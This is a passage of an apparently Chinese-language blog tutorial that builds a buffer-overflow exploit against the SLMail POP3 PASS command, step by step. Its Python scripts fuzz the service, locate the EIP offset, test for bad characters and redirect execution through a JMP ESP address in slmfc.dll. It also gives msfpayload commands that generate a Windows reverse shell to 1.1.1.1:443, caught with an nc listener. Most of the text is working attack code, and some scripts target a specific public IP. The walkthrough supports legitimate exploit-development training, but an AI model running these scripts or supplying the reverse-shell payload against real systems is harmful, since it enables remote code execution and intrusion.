class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nSending evil buffer...."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'USER user'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>测试PASS命令接收到大量数据时是否会溢出<br>EIP寄存器存放下一条指令的地址</p><blockquote><h4 id="python代码02-py"><a href="#python代码02-py" class="headerlink" title="python代码02.py"></a>python代码<code>02.py</code></h4></blockquote><p>以每200递增循环发送A,测试溢出点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buffer=[<span class="string">"A"</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer)&lt;=<span class="number">30</span>:</span><br><span class="line">buffer.append(<span class="string">"A"</span>=*counter)</span><br><span class="line">counter=counter+<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes"</span> % len(string)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+string+<span class="string">'\r\n'</span>)</span><br><span class="line">s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><blockquote><h4 id="2700个字符实现EIP寄存器溢出03-py"><a href="#2700个字符实现EIP寄存器溢出03-py" class="headerlink" title="2700个字符实现EIP寄存器溢出03.py"></a>2700个字符实现EIP寄存器溢出<code>03.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">'A'</span>*<span class="number">2700</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>找到精确溢出的4个字符<br>    二分法<br>    唯一字串法<br>        <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700</code></p><blockquote><h4 id="python代码04-py"><a href="#python代码04-py" class="headerlink" title="python代码04.py"></a>python代码<code>04.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=</span><br><span class="line"><span class="string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 39694438</code>    #计算EIP寄存器内存地址ASCII码在2700唯一字符串中的偏移量</p><blockquote><h4 id="python代码05-py"><a href="#python代码05-py" class="headerlink" title="python代码05.py"></a>python代码<code>05.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*<span class="number">20</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>思路:<br>将EIP修改为shellcode代码的内存地址,将shellcode写入到该地址空间,程序读取EIP寄存器数值,将跳转到shellcode代码段并执行；<br>寻找可存放shellcode的内存空间</p><blockquote><h4 id="python代码06-py"><a href="#python代码06-py" class="headerlink" title="python代码06.py"></a>python代码<code>06.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*(<span class="number">3500</span><span class="number">-2606</span><span class="number">-4</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>不同类型的程序,协议,漏洞,会将某些字符认为是坏字符,这些字符有固定用途<br>    返回地址,Shellcode,buffer中都不能出现坏字符<br>    null byte (0x00) 空字符,用于终止字符串的拷贝操作<br>    return (0x0D)回车操作,表示POP3 PASS命令输入完成<br>    思路:发送0x00—-0xff 256个字符,查找所有坏字符<br>    00000000 11111111 256 #二进制</p><blockquote><h4 id="python代码07-py"><a href="#python代码07-py" class="headerlink" title="python代码07.py"></a>python代码<code>07.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span></span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span></span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span></span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span></span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span></span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span></span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><pre><code>0x0A    0x0D    0x00    #坏字符</code></pre><p>重定向数据流<br>    用ESP的地址替换EIP的值<br>    但是ESP地址变化,硬编码不可行<br>    SLMaail线程应用程序,操作系统为每个线程分配一段地址范围,每个线程地址范围不确定<br>变通思路<br>    在内存中寻找地址固定的系统模块<br>    在模块中寻找JMP ESP 指令的地址跳转,再由该指令间接跳转到ESP,从而执行shellcode<br>    mona.py脚本识别内存模块,搜索”return address”是JMP ESP指令的模块<br>    寻找无DEP,ALSR保护的内存地址<br>    内存地址不包含坏字符<br>    寻找不受保护的系统模块<br>        !mona modules<br>    将汇编指令jmp esp 转换为二进制<br>        <code>/usr/share/metasploit-framework/tools/exploit/masm_shell.rb</code><br>        FFE4<br>    在模块中搜索FFE4指令<br>    <code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code><br>        选择不包含坏字符的内存地址<br>    在该地址设置断点<br>    重发buffer</p><blockquote><h4 id="python代码08-py-地址全翻转"><a href="#python代码08-py-地址全翻转" class="headerlink" title="python代码08.py(地址全翻转)"></a>python代码<code>08.py</code>(地址全翻转)</h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"C"</span>*<span class="number">390</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h4></blockquote><p><code>Scratch</code>        #写shellcode的工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;msfpayload -l</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 C</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 R | .&#x2F;msfencode -b &quot;\x00\x0a\x0d&quot;</span><br><span class="line">nc -vip 443</span><br></pre></td></tr></table></figure><blockquote><h4 id="python代码09-py"><a href="#python代码09-py" class="headerlink" title="python代码09.py"></a>python代码<code>09.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span>+</span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span>+</span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span>+</span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span>+</span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span>+</span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span>+</span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span>+</span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span>+</span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span>+</span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span>+</span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span>+</span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span>+</span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span>+</span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span>+</span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span>+</span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"\x90"</span>*<span class="number">8</span>+shellcode</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span 